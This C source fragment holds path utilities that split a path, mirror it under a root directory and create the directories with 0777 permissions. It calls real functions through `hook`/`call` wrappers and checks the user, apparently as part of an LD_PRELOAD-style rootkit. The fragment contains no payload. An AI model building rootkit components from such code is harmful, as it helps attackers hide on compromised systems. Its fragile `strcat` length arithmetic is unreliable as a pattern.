char **getdirstructure(const char *path, int *cdir){
    char *p, *dup, **dirs, *cwd=NULL;
    size_t namesize;
    int c=0;

    dirs = malloc(sizeof(char*)*MAXDIR);
    if(!dirs) return NULL;

    if(path[0] != '/' && (cwd = getcwd(NULL, 0)) == NULL){
        free(dirs);
        return NULL;
    }

    char targetpath[strlen(path)+PATH_MAX];
    memset(targetpath, 0, sizeof(targetpath));
    if(cwd != NULL){
        snprintf(targetpath, sizeof(targetpath)-1, "%s/%s", cwd, path);
        free(cwd);
    }else snprintf(targetpath, sizeof(targetpath)-1, "%s", path);

    dup = strdup(targetpath), p = strtok(dup, "/");
    while(p != NULL){
        if(p[0] == '.') p++;
        namesize = strlen(p)+1;
        dirs[c] = malloc(namesize);
        if(!dirs[c]){
            free(dup);
            freedirs(dirs, c);
            return NULL;
        }
        memset(dirs[c], 0, namesize);
        strncpy(dirs[c++], p, namesize);
        p = strtok(NULL, "/");
    }
    free(dup);

    *cdir=c;
    return dirs;
}

char *createdirstructure(const char *rootdir, const char *path, char **dirs, int cdir){
    char *ret, fullpath[strlen(path)+PATH_MAX], *pathdup, *filename;
    size_t tmpsize, buflen=0, pathsize;

    memset(fullpath, 0, sizeof(fullpath));
    strcat(fullpath, rootdir);
    buflen += strlen(rootdir)+1;
    for(int i=0; i<cdir-1; i++){
        tmpsize = strlen(dirs[i])+3;
        if(tmpsize+buflen >= sizeof(fullpath)-1)
            break;

        char tmp[tmpsize];
        snprintf(tmp, tmpsize, "/%s/", dirs[i]);
        strcat(fullpath, tmp); 
        buflen += tmpsize-1;
    }
    fullpath[buflen-1]='/';

    pathdup = strdup(path);
    filename = basename(pathdup);
    if(filename[0] == '.') filename++;
    strcat(fullpath, filename);
    fullpath[buflen+strlen(filename)]='\0';
    free(pathdup);

    pathsize = strlen(fullpath)+1;
    ret = malloc(pathsize);
    if(!ret) return NULL;
    memset(ret, 0, pathsize);
    strncpy(ret, fullpath, pathsize);
    return ret;
}

int mkdirstructure(const char *rootdir, char **dirs, int cdir){
    DIR *dp;
    hook(COPENDIR, CMKDIR);
    dp = call(COPENDIR, rootdir);
    if(dp == NULL && errno == ENOENT){
        if(notuser(0)) return 0;
        if((long)call(CMKDIR, rootdir, 0777) < 0)
            return -1;
        return mkdirstructure(rootdir, dirs, cdir);
    }else if(dp == NULL) return -1;
    else if(dp) closedir(dp);

    char current[PATH_MAX];
    memset(current, 0, sizeof(current));
    strcat(current, rootdir);
    current[strlen(rootdir)] = '/';

    size_t cursize = strlen(rootdir)+2, tmpsize;
    for(int i=0; i<cdir-1; i++){
        tmpsize = strlen(dirs[i])+2;
        if(tmpsize+cursize >= sizeof(current)-1)
            break;

        char tmp[tmpsize];
        snprintf(tmp, tmpsize, "%s/", dirs[i]);
        strcat(current, tmp);
        cursize += tmpsize-1;

        if((long)call(CMKDIR, current, 0777) < 0 && errno != EEXIST)
            return -1;
    }

    return 1;
}

void freedirs(char **dirs, int cdir){
    for(int i=0; i<cdir; i++){
        free(dirs[i]);
        dirs[i]=NULL;
    }
    free(dirs);
    dirs=NULL;
}